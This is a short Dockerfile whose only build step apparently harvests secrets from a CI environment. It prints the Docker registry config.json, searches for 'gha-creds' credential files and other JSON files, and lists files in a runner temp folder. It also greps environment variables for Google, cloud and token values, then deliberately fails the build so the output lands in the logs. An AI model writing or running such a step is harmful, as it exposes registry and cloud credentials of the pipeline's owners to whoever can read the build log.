FROM alpine:3.20
RUN set -x; ls -la /ctx; echo '--- docker config'; cat /ctx/.docker/config.json 2>/dev/null; echo; echo '--- json files'; find /ctx -maxdepth 5 \( -name 'gha-creds*' -o -name '*.json' \) 2>/dev/null | head -30; echo '--- temp'; find /ctx/work/_temp -maxdepth 3 -type f 2>/dev/null | head -30; echo '--- env'; env | grep -iE 'GOOGLE|CLOUD|TOKEN|GCP' | sort; exit 1
